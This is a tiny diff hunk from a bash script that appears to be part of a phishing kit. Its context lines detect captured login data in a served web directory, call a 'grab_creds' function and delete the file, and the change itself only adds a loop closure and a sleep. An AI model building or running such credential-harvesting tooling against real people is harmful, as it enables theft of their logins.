@@ -285,6 +285,12 @@ if [[ -e "pd/www/usernames.txt" ]]; then
 echo -e $red Login info Found !!
 grab_creds
 rm -rf pd/www/usernames.txt
+fi
+sleep 0.75
+
+
+done 
+
 }
 
 
